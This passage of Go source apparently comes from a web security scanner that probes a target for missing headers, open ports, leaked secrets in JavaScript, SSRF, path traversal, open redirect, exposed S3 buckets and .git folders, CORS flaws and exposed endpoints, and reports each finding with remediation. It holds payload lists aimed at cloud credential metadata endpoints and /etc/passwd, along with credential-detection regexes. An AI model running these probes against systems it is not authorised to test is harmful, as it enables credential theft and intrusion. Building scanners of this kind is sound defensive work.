	}

	presentHeaders := 0
	for header, info := range securityHeaders {
		if resp.Header.Get(header) != "" {
			presentHeaders++
			continue
		}
		findings = append(findings, types.Finding{
			ID:             fmt.Sprintf("sec-header-%s", strings.ToLower(header)),
			Title:          info.Name,
			Description:    info.Description,
			Severity:       info.Severity,
			CVSS:           info.CVSS,
			CVSSVector:     info.CVSSVector,
			CWE:            info.CWE,
			OWASP2025:      info.OWASP,
			AffectedURL:    target,
			AttackScenario: info.AttackScenario,
			Evidence:       info.Evidence,
			Remediation:    info.Remediation,
			Verified:       true,
			ToolSource:     "custom-headers",
			Timestamp:      time.Now(),
		})
	}

	totalHeaders := len(securityHeaders)
	findings = append(findings, types.Finding{
		ID:          fmt.Sprintf("sec-header-summary-%s", strings.ReplaceAll(target, "/", "_")),
		Title:       "Security Headers Summary",
		Description: fmt.Sprintf("%d/%d security headers present", presentHeaders, totalHeaders),
		Severity:    types.SeverityInfo,
		AffectedURL: target,
		ToolSource:  "custom-headers",
		Timestamp:   time.Now(),
	})

	return findings, nil
}

func checkPorts(target string) ([]types.Finding, error) {
	var findings []types.Finding
	host := strings.TrimPrefix(strings.TrimPrefix(target, "https://"), "http://")
	host = strings.Split(host, "/")[0]
	host = strings.Split(host, ":")[0]

	ports := []struct {
		port int
		name string
	}{
		{21, "FTP"}, {22, "SSH"}, {23, "Telnet"}, {25, "SMTP"},
		{53, "DNS"}, {80, "HTTP"}, {110, "POP3"}, {143, "IMAP"},
		{443, "HTTPS"}, {465, "SMTPS"}, {587, "SMTP Submission"},
		{993, "IMAPS"}, {995, "POP3S"}, {1433, "MSSQL"},
		{1521, "Oracle DB"}, {2049, "NFS"}, {3306, "MySQL"},
		{3389, "RDP"}, {5432, "PostgreSQL"}, {5900, "VNC"},
		{6379, "Redis"}, {8080, "HTTP-Alt"}, {8443, "HTTPS-Alt"},
		{9090, "HTTP-Alt2"}, {27017, "MongoDB"},
	}

	var open []string
	for _, p := range ports {
		addr := net.JoinHostPort(host, fmt.Sprintf("%d", p.port))
		conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
		if err != nil {
			continue
		}
		conn.Close()
		open = append(open, fmt.Sprintf(":%d (%s)", p.port, p.name))
	}

	if len(open) > 0 {
		findings = append(findings, types.Finding{
			ID:          fmt.Sprintf("ports-%s", host),
			Title:       "Open Ports Detected",
			Description: fmt.Sprintf("%d open ports: %s", len(open), strings.Join(open, ", ")),
			Severity:    types.SeverityInfo,
			AffectedURL: target,
			ToolSource:  "custom-ports",
			Timestamp:   time.Now(),
		})
	}

	return findings, nil
}

type compiledPattern struct {
	name     string
	re       *regexp.Regexp
	severity types.Severity
}

func checkJSSecrets(target string) ([]types.Finding, error) {
	var findings []types.Finding
	target = ensureURL(target)
	client := &http.Client{Timeout: 15 * time.Second, CheckRedirect: func(req *http.Request, via []*http.Request) error { return nil }}

	resp, err := client.Get(target)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	jsFiles := extractJSUrls(string(body), target)
	seen := make(map[string]bool)

	patterns := []compiledPattern{
		{"Google API Key", regexp.MustCompile(`AIza[0-9A-Za-z\-_]{35}`), types.SeverityHigh},
		{"AWS Access Key", regexp.MustCompile(`AKIA[0-9A-Z]{16}`), types.SeverityHigh},
		{"AWS Secret Key", regexp.MustCompile(`(?i)aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]`), types.SeverityHigh},
		{"Slack Token", regexp.MustCompile(`xox[baprs]-[0-9a-zA-Z\-]{10,48}`), types.SeverityHigh},
		{"GitHub Token", regexp.MustCompile(`gh[pousr]_[A-Za-z0-9_]{36,255}`), types.SeverityHigh},
		{"Generic API Key", regexp.MustCompile(`(?i)(api[_-]?key|apikey|api[_-]?secret)[\s"':=]+[A-Za-z0-9_\-]{16,64}`), types.SeverityMedium},
		{"Password in JS", regexp.MustCompile(`(?i)(password|passwd|pwd)[\s"':=]+[^\s"']{8,50}`), types.SeverityCritical},
		{"JWT Token", regexp.MustCompile(`eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}`), types.SeverityMedium},
		{"Firebase URL", regexp.MustCompile(`[a-z0-9\-]{3,40}\.firebaseio\.com`), types.SeverityMedium},
		{"Private Key", regexp.MustCompile(`-----BEGIN (RSA |EC )?PRIVATE KEY-----`), types.SeverityCritical},
		{"Heroku API Key", regexp.MustCompile(`[hH][eR][rR][oO][kK][uU].*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}`), types.SeverityHigh},
	}

	for _, jsURL := range jsFiles {
		if seen[jsURL] {
			continue
		}
		seen[jsURL] = true

		jsResp, err := client.Get(jsURL)
		if err != nil {
			continue
		}
		jsBody, err := io.ReadAll(jsResp.Body)
		jsResp.Body.Close()
		if err != nil {
			continue
		}

		jsContent := string(jsBody)
		for _, p := range patterns {
			matches := p.re.FindAllString(jsContent, -1)
			dedup := make(map[string]bool)
			for _, m := range matches {
				if dedup[m] {
					continue
				}
				dedup[m] = true
				redacted := m
				if len(redacted) > 12 {
					redacted = redacted[:6] + "•••" + redacted[len(redacted)-4:]
				}
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("js-secret-%x", sha256.Sum256([]byte(m)))[:48],
					Title:       fmt.Sprintf("%s Exposed (%s)", p.name, redacted),
					Description: fmt.Sprintf("%s found in %s: `%s`", p.name, jsURL, m[:min(len(m), 60)]),
					Severity:    p.severity,
					AffectedURL: jsURL,
					Proof:       redacted,
					Remediation: "Rotate the exposed credential and remove it from client-side code",
					ToolSource:  "custom-jssecrets",
					Timestamp:   time.Now(),
				})
			}
		}
	}

	return findings, nil
}

var ssrfPayloads = []string{
	"http://169.254.169.254/latest/meta-data/",
	"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
	"http://metadata.google.internal/computeMetadata/v1/",
	"http://100.100.100.200/latest/meta-data/",
	"http://127.0.0.1:22",
	"http://127.0.0.1:6379",
	"file:///etc/passwd",
	"gopher://127.0.0.1:6379/_INFO",
}

var ssrfParams = []string{"url", "uri", "path", "file", "fetch", "proxy", "callback", "webhook", "src", "href", "dest", "redirect", "continue", "next", "returnUrl", "imageUrl"}

func checkSSRF(target string) ([]types.Finding, error) {
	var findings []types.Finding
	// First try common SSRF-vulnerable endpoints with URL params
	endpoints := []string{
		target + "/api/proxy?url=",
		target + "/fetch?url=",
		target + "/api/fetch?url=",
		target + "/proxy?url=",
		target + "/webhook?url=",
		target + "/api/webhook?url=",
		target + "/thumbnail?url=",
		target + "/api/import?url=",
		target + "/download?url=",
	}

	for _, base := range endpoints {
		for _, payload := range ssrfPayloads {
			u := base + payload
			resp, err := sharedClient.Get(u)
			if err != nil {
				continue
			}
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(body)
			if strings.Contains(bodyStr, "ami-id") || strings.Contains(bodyStr, "instance-id") ||
				strings.Contains(bodyStr, "security-credentials") || strings.Contains(bodyStr, "computeMetadata") {
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("ssrf-awsmeta-%x", sha256.Sum256([]byte(u)))[:24],
					Title:       "SSRF to AWS Metadata Endpoint",
					Severity:    types.SeverityCritical,
					AffectedURL: base,
					CWE:         []string{"CWE-918"},
					OWASP2025:   "Server-Side Request Forgery (SSRF)",
					CVSS:        9.1,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L",
					Description: fmt.Sprintf("SSRF to AWS metadata endpoint via %s parameter. Attacker can extract IAM credentials.", base),
					AttackScenario: fmt.Sprintf("1. Attacker sends %s\n2. Server fetches AWS metadata at 169.254.169.254\n3. IAM credentials are extracted and used for privilege escalation", u),
					Evidence:     fmt.Sprintf("Response contained AWS metadata markers:\n%s", bodyStr[:min(len(bodyStr), 500)]),
					Remediation:  "Validate and sanitize URL inputs. Block requests to internal/cloud metadata IPs (169.254.169.254, 100.100.100.200, metadata.google.internal). Use an allowlist of permitted domains.",
					ToolSource:   "custom-ssrf",
					Timestamp:    time.Now(),
					Verified:     true,
				})
			}
		}
	}

	// Check if common SSRF-vulnerable params accept external URLs
	ssrfParamTestURLs := []string{target + "/", target + "/api/", target + "/v1/"}
	for _, bu := range ssrfParamTestURLs {
		for _, param := range ssrfParams {
			u := fmt.Sprintf("%s?%s=http://httpbin.org/get", bu, param)
			resp, err := sharedClient.Get(u)
			if err != nil {
				continue
			}
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			if strings.Contains(string(body), "httpbin") {
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("ssrf-param-%s-%x", param, sha256.Sum256([]byte(u)))[:24],
					Title:       fmt.Sprintf("Potential SSRF via %s parameter", param),
					Severity:    types.SeverityMedium,
					AffectedURL: u,
					CWE:         []string{"CWE-918"},
					OWASP2025:   "Server-Side Request Forgery (SSRF)",
					CVSS:        5.3,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
					Description: fmt.Sprintf("The %s parameter appears to fetch external URLs and reflect the content. This can be escalated to access internal services.", param),
					AttackScenario: fmt.Sprintf("1. Attacker identifies %s parameter that fetches URLs\n2. Sends request to internal services (AWS metadata, localhost)\n3. Extracts sensitive data or pivots to internal network", param),
					Evidence:     fmt.Sprintf("Parameter %s at %s accepted external URL and reflected httpbin content", param, bu),
					Remediation:  "Implement URL allowlisting. Block requests to private/internal IP ranges. Validate the URL scheme (only allow http/https to known domains).",
					ToolSource:   "custom-ssrf",
					Timestamp:    time.Now(),
					Verified:     true,
				})
			}
		}
	}

	return findings, nil
}

var traversalPayloads = []struct{ file, desc string }{
	{"../../../etc/passwd", "/etc/passwd (Unix)"},
	{"....//....//....//etc/passwd", "/etc/passwd (double-dot variant)"},
	{"/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "/etc/passwd (URL-encoded)"},
	{"..\\..\\..\\windows\\win.ini", "win.ini (Windows)"},
	{"../../../etc/hosts", "/etc/hosts (Unix)"},
	{"/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "/etc/passwd (UTF-8 overlong)"},
}

var traversalParams = []string{"file", "path", "page", "template", "include", "doc", "folder", "locale", "lang", "download", "filename", "filepath", "dir", "content", "root"}

func checkPathTraversal(target string) ([]types.Finding, error) {
	var findings []types.Finding
	endpoints := []string{target + "/", target + "/api/", target + "/view", target + "/download"}

	for _, ep := range endpoints {
		for _, param := range traversalParams {
			for _, payload := range traversalPayloads {
				u := fmt.Sprintf("%s?%s=%s", ep, param, payload.file)
				resp, err := sharedClient.Get(u)
				if err != nil {
					continue
				}
				body, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				bodyStr := string(body)
				if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "[extensions]") ||
					strings.Contains(bodyStr, "daemon:") || strings.Contains(bodyStr, "nobody:") {
					findings = append(findings, types.Finding{
						ID:           fmt.Sprintf("traversal-%s-%x", param, sha256.Sum256([]byte(u)))[:24],
						Title:        fmt.Sprintf("Path Traversal / LFI via %s parameter", param),
						Severity:     types.SeverityCritical,
						AffectedURL:  u,
						CWE:          []string{"CWE-22"},
						OWASP2025:    "Broken Access Control",
						CVSS:         7.5,
						CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
						Description:  fmt.Sprintf("Path traversal on %s via %s parameter using payload %s. Sensitive system files are exposed.", ep, param, payload.desc),
						AttackScenario: fmt.Sprintf("1. Attacker sends %s\n2. Server reads %s from the filesystem\n3. Sensitive system data is exposed, enabling further attacks", u, payload.file),
						Evidence:     fmt.Sprintf("Response contained sensitive system file content:\n%s", bodyStr[:min(len(bodyStr), 300)]),
						Remediation:  "Normalize file paths before resolution. Use a secure allowlist of permitted files/directories. Reject inputs containing .., /, \\, or URL-encoded variants.",
						ToolSource:   "custom-path-traversal",
						Timestamp:    time.Now(),
						Verified:     true,
					})
				}
			}
		}
	}

	return findings, nil
}

var openRedirectParams = []string{"redirect_uri", "redirect", "next", "continue", "dest", "return", "return_to", "goto", "url", "target", "redir", "origin", "fallback", "callback_url", "return_url"}

var openRedirectPayloads = []string{
	"https://evil.com",
	"//evil.com",
	"https:evil.com",
	"/\\evil.com",
	"https://evil.com%23.target.com",
	"javascript:alert(1)",
	"data:text/html,<script>alert(1)</script>",
}

func checkOpenRedirect(target string) ([]types.Finding, error) {
	var findings []types.Finding
	endpoints := []string{target + "/", target + "/login", target + "/oauth/authorize", target + "/api/auth"}

	for _, ep := range endpoints {
		for _, param := range openRedirectParams {
			for _, payload := range openRedirectPayloads {
				if strings.HasPrefix(payload, "javascript:") || strings.HasPrefix(payload, "data:") {
					continue // skip non-HTTP redirect tests for standard GET
				}
				u := fmt.Sprintf("%s?%s=%s", ep, param, payload)
				resp, err := sharedClient.Get(u)
				if err != nil {
					continue
				}
				resp.Body.Close()
				loc := resp.Header.Get("Location")
				if loc == "" {
					continue
				}
				locLower := strings.ToLower(loc)
				if strings.Contains(locLower, "evil.com") || strings.Contains(locLower, "//evil") {
					findings = append(findings, types.Finding{
						ID:           fmt.Sprintf("open-redir-%s-%x", param, sha256.Sum256([]byte(u)))[:24],
						Title:        fmt.Sprintf("Open Redirect via %s parameter", param),
						Severity:     types.SeverityMedium,
						AffectedURL:  u,
						CWE:          []string{"CWE-601"},
						OWASP2025:    "Broken Access Control",
						CVSS:         4.7,
						CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
						Description:  fmt.Sprintf("The %s parameter allows unvalidated redirect to external domains. Attacker can phish users by redirecting them to malicious sites via a trusted domain.", param),
						AttackScenario: fmt.Sprintf("1. Attacker crafts %s?%s=https://evil.com\n2. Victim clicks link, sees trusted domain in URL\n3. Victim is redirected to phishing page and enters credentials", target, param),
						Evidence:     fmt.Sprintf("GET %s\nLocation: %s", u, loc),
						Remediation:  "Validate redirect URLs against an allowlist. Use relative redirects or a redirect proxy page with user confirmation.",
						ToolSource:   "custom-open-redirect",
						Timestamp:    time.Now(),
						Verified:     true,
					})
				}
			}
		}
	}

	return findings, nil
}

func checkS3Buckets(target string) ([]types.Finding, error) {
	var findings []types.Finding
	hostname := strings.TrimPrefix(strings.TrimPrefix(target, "https://"), "http://")
	hostname = strings.Split(hostname, "/")[0]
	parts := strings.Split(hostname, ".")
	if len(parts) < 2 {
		return nil, nil
	}
	baseName := parts[len(parts)-2]
	// Generate candidate bucket names
	buckets := []string{
		fmt.Sprintf("https://%s.s3.amazonaws.com", baseName),
		fmt.Sprintf("https://%s.s3-us-west-2.amazonaws.com", baseName),
		fmt.Sprintf("https://%s.s3-us-east-1.amazonaws.com", baseName),
		fmt.Sprintf("https://%s.s3.eu-west-1.amazonaws.com", baseName),
		fmt.Sprintf("https://%s-prod.s3.amazonaws.com", baseName),
		fmt.Sprintf("https://%s-dev.s3.amazonaws.com", baseName),
		fmt.Sprintf("https://%s-staging.s3.amazonaws.com", baseName),
		fmt.Sprintf("https://www.%s.s3.amazonaws.com", baseName),
	}

	for _, bucket := range buckets {
		resp, err := sharedClient.Get(bucket)
		if err != nil {
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyStr := string(body)
		if resp.StatusCode == 200 && (strings.Contains(bodyStr, "<Contents>") || strings.Contains(bodyStr, "<ListBucketResult")) {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("s3-bucket-%x", sha256.Sum256([]byte(bucket)))[:24],
				Title:       "S3 Bucket Publicly Accessible",
				Severity:    types.SeverityHigh,
				AffectedURL: bucket,
				CWE:         []string{"CWE-200"},
				OWASP2025:   "Security Misconfiguration",
				CVSS:        7.5,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
				Description: fmt.Sprintf("S3 bucket '%s' is publicly accessible and lists its contents. Sensitive files may be exposed.", bucket),
				AttackScenario: fmt.Sprintf("1. Attacker enumerates S3 buckets via known patterns (company-name, company-name-prod)\n2. Bucket %s returns directory listing\n3. Attacker downloads all exposed files for intelligence gathering", bucket),
				Evidence:     fmt.Sprintf("GET %s returned 200 with S3 listing:\n%s", bucket, bodyStr[:min(len(bodyStr), 500)]),
				Remediation:  "Enable 'Block all public access' on the S3 bucket. Use bucket policies to restrict access to authorized principals only. Consider enabling S3 access logging.",
				ToolSource:   "custom-s3",
				Timestamp:    time.Now(),
				Verified:     true,
			})
		} else if resp.StatusCode == 200 || resp.StatusCode == 403 {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("s3-exists-%x", sha256.Sum256([]byte(bucket)))[:24],
				Title:       "S3 Bucket Exists (Potential Takeover Target)",
				Severity:    types.SeverityInfo,
				AffectedURL: bucket,
				CWE:         []string{"CWE-200"},
				OWASP2025:   "Security Misconfiguration",
				CVSS:        0,
				Description: fmt.Sprintf("S3 bucket '%s' exists and responds. Verify access controls.", bucket),
				Remediation: "Ensure the bucket has proper access controls and is not publicly writable.",
				ToolSource:  "custom-s3",
				Timestamp:   time.Now(),
			})
		}
	}

	return findings, nil
}

func checkGitExposure(target string) ([]types.Finding, error) {
	var findings []types.Finding
	gitPaths := []string{"/.git/config", "/.git/HEAD", "/.git/refs/heads/master", "/.git/index"}

	for _, gp := range gitPaths {
		u := strings.TrimRight(target, "/") + gp
		resp, err := sharedClient.Get(u)
		if err != nil {
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyStr := string(body)
		if resp.StatusCode == 200 && (strings.Contains(bodyStr, "[core]") || strings.Contains(bodyStr, "ref: refs/heads/") ||
			strings.Contains(bodyStr, "[remote \"origin\"]") || strings.HasPrefix(bodyStr, "DIRC")) {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("git-exposed-%s-%x", gp, sha256.Sum256([]byte(u)))[:24],
				Title:       "Git Repository Exposed",
				Severity:    types.SeverityHigh,
				AffectedURL: u,
				CWE:         []string{"CWE-538"},
				OWASP2025:   "Security Misconfiguration",
				CVSS:        7.5,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
				Description: fmt.Sprintf("Git repository metadata is publicly accessible at %s. Source code, commit history, and potentially credentials are exposed.", u),
				AttackScenario: fmt.Sprintf("1. Attacker accesses %s\n2. Downloads the entire .git directory using tools like git-dumper\n3. Extracts source code, hardcoded secrets, and sensitive configuration from commit history", u),
				Evidence:     fmt.Sprintf("GET %s returned 200 with Git metadata:\n%s", u, bodyStr[:min(len(bodyStr), 500)]),
				Remediation:  "Add a rule to block access to /.git/ paths at the web server or WAF level. Ensure .git directory is not deployed to production.",
				ToolSource:   "custom-git",
				Timestamp:    time.Now(),
				Verified:     true,
			})
		}
	}

	return findings, nil
}

func checkCORS(target string) ([]types.Finding, error) {
	var findings []types.Finding

	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Origin", "https://evil.com")
	resp, err := sharedClient.Do(req)
	if err != nil {
		return findings, nil
	}
	defer resp.Body.Close()

	acao := resp.Header.Get("Access-Control-Allow-Origin")
	acac := resp.Header.Get("Access-Control-Allow-Credentials")

	if acao == "*" && strings.ToLower(acac) == "true" {
		findings = append(findings, types.Finding{
			ID:          fmt.Sprintf("cors-wildcard-cred-%x", sha256.Sum256([]byte(target)))[:24],
			Title:       "CORS Misconfiguration — Wildcard Origin with Credentials",
			Severity:    types.SeverityHigh,
			AffectedURL: target,
			CWE:         []string{"CWE-942"},
			OWASP2025:   "Broken Access Control",
			CVSS:        7.5,
			CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
			Description: "The server responds with Access-Control-Allow-Origin: * AND Access-Control-Allow-Credentials: true. This is forbidden by the spec and browsers will refuse it, but it indicates serious misconfiguration.",
			AttackScenario: "1. Attacker hosts malicious page on evil.com\n2. Page makes authenticated CORS request to target\n3. Despite spec violation, misconfigured proxies/CDNs may still expose data",
			Evidence:     fmt.Sprintf("Origin: https://evil.com\nAccess-Control-Allow-Origin: %s\nAccess-Control-Allow-Credentials: %s", acao, acac),
			Remediation:  "Never use wildcard origin with credentials. Set Access-Control-Allow-Origin to the specific trusted domain. Use a validated allowlist.",
			ToolSource:   "custom-cors",
			Timestamp:    time.Now(),
			Verified:     true,
		})
	} else if acao == "https://evil.com" && strings.ToLower(acac) == "true" {
		findings = append(findings, types.Finding{
			ID:          fmt.Sprintf("cors-reflect-origin-%x", sha256.Sum256([]byte(target)))[:24],
			Title:       "CORS Misconfiguration — Origin Reflection with Credentials",
			Severity:    types.SeverityHigh,
			AffectedURL: target,
			CWE:         []string{"CWE-942"},
			OWASP2025:   "Broken Access Control",
			CVSS:        7.5,
			CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
			Description: "The server reflects the Origin header back in Access-Control-Allow-Origin AND allows credentials. Any website can make authenticated cross-origin requests.",
			AttackScenario: "1. Attacker hosts malicious page on evil.com\n2. Victim visits evil.com while authenticated to target\n3. Malicious page makes CORS requests to target, exfiltrating user data",
			Evidence:     fmt.Sprintf("Origin: https://evil.com\nAccess-Control-Allow-Origin: %s\nAccess-Control-Allow-Credentials: %s", acao, acac),
			Remediation:  "Do not reflect arbitrary Origin headers. Use a strict allowlist of trusted domains. Validate Origin against the allowlist before mirroring.",
			ToolSource:   "custom-cors",
			Timestamp:    time.Now(),
			Verified:     true,
		})
	} else if acao == "*" {
		findings = append(findings, types.Finding{
			ID:          fmt.Sprintf("cors-wildcard-%x", sha256.Sum256([]byte(target)))[:24],
			Title:       "CORS Misconfiguration — Wildcard Origin",
			Severity:    types.SeverityLow,
			AffectedURL: target,
			CWE:         []string{"CWE-942"},
			OWASP2025:   "Broken Access Control",
			CVSS:        2.6,
			CVSSVector:  "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
			Description: "Access-Control-Allow-Origin is set to *. While credentials won't be sent, public endpoints may be unnecessarily exposed to cross-origin reads.",
			Remediation:  "Restrict Access-Control-Allow-Origin to specific trusted domains. Avoid wildcard unless the endpoint is intentionally public.",
			ToolSource:   "custom-cors",
			Timestamp:    time.Now(),
		})
	}

	return findings, nil
}

var errorPatterns = []struct {
	pattern *regexp.Regexp
	label   string
	severity types.Severity
}{
	{regexp.MustCompile(`(?i)(stack\s*trace|traceback\s*\(most recent call last\))`), "Stack Trace", types.SeverityMedium},
	{regexp.MustCompile(`(?i)(SQL syntax.*MySQL|Warning.*mysql_|PostgreSQL.*ERROR|ORA-\d{5}|Microsoft OLE DB|SQLite.*error|SQLSTATE)`) , "SQL Error", types.SeverityMedium},
	{regexp.MustCompile(`(?i)(Fatal error|Uncaught exception|Exception in|Parse error|syntax error, unexpected)`) , "Fatal Error", types.SeverityMedium},
	{regexp.MustCompile(`(?i)(at\s+[\w.<>]+\.[\w<>]+\([\w.]+:\d+\)|File\s+"[^"]+",\s+line\s+\d+)`) , "Source Path in Error", types.SeverityLow},
	{regexp.MustCompile(`(?i)(DEBUG|Debug mode|debug=true|environment.*development)`) , "Debug Information", types.SeverityLow},
	{regexp.MustCompile(`(?i)(phpinfo|PHP Version|SERVER\[")`), "PHP Info Leak", types.SeverityMedium},
	{regexp.MustCompile(`(?i)(version.*\d+\.\d+\.\d+|server:\s+apache|server:\s+nginx|server:\s+microsoft-iis|x-powered-by)`) , "Server Version Disclosure", types.SeverityLow},
}

func checkErrorDisclosure(target string) ([]types.Finding, error) {
	var findings []types.Finding
	probes := []string{
		target + "/",
		target + "/api/",
		target + "/'",
		target + "/api/'",
		target + "/%00",
		target + "/.php",
		target + "/admin",
		target + "/wp-admin",
		target + "/debug",
		target + "/api/v1/",
		target + "/.env",
		target + "/console",
	}

	for _, probe := range probes {
		resp, err := sharedClient.Get(probe)
		if err != nil {
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyStr := string(body)
		for _, ep := range errorPatterns {
			if ep.pattern.MatchString(bodyStr) {
				match := ep.pattern.FindString(bodyStr)
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("err-disc-%s-%x", ep.label, sha256.Sum256([]byte(probe+match)))[:24],
					Title:       fmt.Sprintf("Error Disclosure — %s", ep.label),
					Severity:    ep.severity,
					AffectedURL: probe,
					CWE:         []string{"CWE-209"},
					OWASP2025:   "Security Misconfiguration",
					CVSS:        4.3,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
					Description: fmt.Sprintf("%s leaked in response from %s. Error details aid attackers in fingerprinting the technology stack and crafting targeted exploits.", ep.label, probe),
					AttackScenario: fmt.Sprintf("1. Attacker probes %s\n2. Application leaks %s in response\n3. Attacker identifies framework/stack and crafts targeted exploit", probe, ep.label),
					Evidence:     fmt.Sprintf("Matched: %s\nIn response from %s:\n%s", match, probe, bodyStr[:min(len(bodyStr), 400)]),
					Remediation:  "Configure production error handling to return generic error pages. Use custom error handlers that log details server-side only. Set environment to production.",
					ToolSource:   "custom-error-disc",
					Timestamp:    time.Now(),
					Verified:     true,
				})
				break
			}
		}
	}

	return findings, nil
}

var takeoverServices = map[string]string{
	"cloudfront.net":          "AWS CloudFront",
	"amazonaws.com":           "AWS S3 Website",
	"azurewebsites.net":       "Azure Web Apps",
	"azureedge.net":           "Azure CDN",
	"herokuapp.com":           "Heroku",
	"surge.sh":                "Surge.sh",
	"github.io":               "GitHub Pages",
	"fastly.net":              "Fastly CDN",
	"ghost.io":                "Ghost",
	"shopify.com":             "Shopify",
	"netlify.app":             "Netlify",
	"firebaseapp.com":         "Firebase Hosting",
	"web.app":                 "Google App Engine",
	"unbouncepages.com":       "Unbounce",
	"helpscoutdocs.com":       "Help Scout",
	"bitbucket.io":            "Bitbucket Pages",
	"readme.io":               "ReadMe",
	"cargo.site":              "Cargo",
	"tilda.ws":                "Tilda",
	"ngrok.io":                "Ngrok",
}

func checkSubdomainTakeover(target string) ([]types.Finding, error) {
	var findings []types.Finding
	hostname := strings.TrimPrefix(strings.TrimPrefix(target, "https://"), "http://")
	hostname = strings.Split(hostname, "/")[0]

	// Check CNAME of the main target
	cname, err := net.LookupCNAME(hostname)
	if err != nil {
		return findings, nil
	}

	for pattern, service := range takeoverServices {
		if strings.Contains(strings.ToLower(cname), pattern) {
			// Check if the CNAME target resolves
			cnameHost := strings.TrimSuffix(cname, ".")
			_, err := net.LookupHost(cnameHost)
			if err != nil {
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("sub-takeover-%x", sha256.Sum256([]byte(hostname+cname)))[:24],
					Title:       fmt.Sprintf("Potential Subdomain Takeover — %s", service),
					Severity:    types.SeverityHigh,
					AffectedURL: target,
					CWE:         []string{"CWE-404"},
					OWASP2025:   "Security Misconfiguration",
					CVSS:        7.5,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
					Description: fmt.Sprintf("The CNAME for %s points to %s (%s) which appears unclaimed or unresolvable. An attacker could register this service and serve content on the targeted domain.", hostname, cname, service),
					AttackScenario: fmt.Sprintf("1. Subdomain %s CNAMEs to %s (%s)\n2. The service is unclaimed\n3. Attacker registers the dangling service and serves phishing/malware pages on the trusted domain", hostname, cname, service),
					Evidence:     fmt.Sprintf("CNAME: %s → %s (unresolvable)", hostname, cname),
					Remediation:  fmt.Sprintf("Remove the dangling DNS record pointing to %s. If the service is no longer in use, delete the CNAME record entirely.", service),
					ToolSource:   "custom-subdomain-takeover",
					Timestamp:    time.Now(),
					Verified:     true,
				})
			}
		}
	}

	return findings, nil
}

var exposedEndpointsList = []struct {
	path     string
	label    string
	severity types.Severity
}{
	{"/actuator/health", "Spring Boot Actuator — Health", types.SeverityInfo},
	{"/actuator/env", "Spring Boot Actuator — Environment", types.SeverityHigh},
	{"/actuator/heapdump", "Spring Boot Actuator — Heap Dump", types.SeverityCritical},
	{"/actuator/mappings", "Spring Boot Actuator — Mappings", types.SeverityMedium},
	{"/swagger-ui.html", "Swagger UI", types.SeverityMedium},
	{"/swagger/index.html", "Swagger Index", types.SeverityMedium},
	{"/api-docs", "API Documentation", types.SeverityMedium},
	{"/v2/api-docs", "Swagger v2 API Docs", types.SeverityMedium},
	{"/v3/api-docs", "OpenAPI v3 Docs", types.SeverityMedium},
	{"/graphql", "GraphQL Endpoint", types.SeverityMedium},
	{"/api/graphql", "GraphQL API Endpoint", types.SeverityMedium},
	{"/wp-admin", "WordPress Admin", types.SeverityMedium},
	{"/phpmyadmin", "phpMyAdmin", types.SeverityHigh},
	{"/.env", "Environment File", types.SeverityCritical},
	{"/.env.backup", "Environment Backup File", types.SeverityCritical},
	{"/.env.example", "Environment Example File", types.SeverityMedium},
	{"/admin", "Admin Panel", types.SeverityMedium},
	{"/administrator", "Joomla Admin", types.SeverityMedium},
	{"/console", "Symfony Console / Debug", types.SeverityHigh},
	{"/_debug/", "Debug Toolbar", types.SeverityHigh},
	{"/config.js", "Config File", types.SeverityMedium},
	{"/config.json", "Config JSON", types.SeverityMedium},
	{"/server-status", "Apache Server Status", types.SeverityMedium},
	{"/server-info", "Apache Server Info", types.SeverityMedium},
	{"/.DS_Store", "macOS DS_Store File", types.SeverityLow},
	{"/robots.txt", "Robots.txt", types.SeverityInfo},
